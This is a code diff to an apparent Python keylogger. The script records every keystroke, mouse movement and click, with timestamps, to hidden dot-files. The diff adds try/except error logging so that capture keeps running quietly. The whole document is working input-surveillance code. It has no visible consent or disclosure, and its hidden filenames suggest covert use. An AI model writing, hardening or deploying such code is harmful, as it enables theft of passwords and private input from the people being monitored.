@@ -5,40 +5,60 @@ import threading
 import datetime
 import pynput
 
+
+
 def recordKeys():
     while True:
-        key = keyboard.read_key()
-        event = keyboard.is_pressed(hotkey=key)
-        if event:
-            with open('.keys.txt', 'a') as file:
-                clocktime = datetime.datetime.now().strftime("%r")
-                file.write(f"'{key}'  At {clocktime}\n")
-            
+        try:
+            key = keyboard.read_key()
+            event = keyboard.is_pressed(hotkey=key)
+            if event:
+                with open('.keys.txt', 'a') as file:
+                    clocktime = datetime.datetime.now().strftime("%r")
+                    file.write(f"'{key}'  At {clocktime}\n")
+        except Exception as e:
+            clocktime = datetime.datetime.now().strftime("%r")
+            with open(".ERRORlogs.txt", 'a') as errorfile:
+                errorfile.write(f'ERROR in Key Records: \n{e}\n\n')    
 
 
 def mouseMonitor():
-    size = pyautogui.size()
-    with open('.mouse.txt', 'w') as file:
-        file.write(f"Size: {size.width}x{size.height} \n")
-    Xcopy, Ycopy = 0, 0
-    
+    try:
+        size = pyautogui.size()
+        with open('.mouse.txt', 'w') as file:
+            file.write(f"Size: {size.width}x{size.height} \n")
+        Xcopy, Ycopy = 0, 0
+    except Exception as e:
+            clocktime = datetime.datetime.now().strftime("%r")
+            with open(".ERRORlogs.txt", 'a') as errorfile:
+                errorfile.write(f'ERROR in Mouse Monitor first part: \n{e}\n\n') 
+
+
     while True:
-        position = pyautogui.position()
-        if position.x != Xcopy or position.y != Ycopy:
-            with open('.mouse.txt', 'a') as file:
-                clocktime = datetime.datetime.now().strftime("%r")
-                file.write(f"Mouse Position: X: {position.x}   Y:{position.y}  At {clocktime}\n")
-                Xcopy, Ycopy = position.x, position.y
-                time.sleep(0.2)
-    
+        try:
+            position = pyautogui.position()
+            if position.x != Xcopy or position.y != Ycopy:
+                with open('.mouse.txt', 'a') as file:
+                    clocktime = datetime.datetime.now().strftime("%r")
+                    file.write(f"Mouse Position: X: {position.x}   Y:{position.y}  At {clocktime}\n")
+                    Xcopy, Ycopy = position.x, position.y
+                    time.sleep(0.2)
+        except Exception as e:
+            clocktime = datetime.datetime.now().strftime("%r")
+            with open(".ERRORlogs.txt", 'a') as errorfile:
+                errorfile.write(f'ERROR in Mouse Monitoring: \n{e}\n\n') 
 
 def clickcheck(x, y, button, pressed, injected):
-    if pressed:
-        position = pyautogui.position()
-        clocktime = datetime.datetime.now().strftime("%r")
-        with open('.mouse.txt', 'a') as file:
-            file.write(f"Click '{button}': {position.x}   Y:{position.y}  At {clocktime} \n")
-    
+    try:
+        if pressed:
+            position = pyautogui.position()
+            clocktime = datetime.datetime.now().strftime("%r")
+            with open('.mouse.txt', 'a') as file:
+                file.write(f"Click '{button}': {position.x}   Y:{position.y}  At {clocktime} \n")
+    except Exception as e:
+            clocktime = datetime.datetime.now().strftime("%r")
+            with open(".ERRORlogs.txt", 'a') as errorfile:
+                errorfile.write(f'ERROR in Click checking: \n{e}\n\n') 
 
 if __name__ == "__main__":
     print("Hello user...")
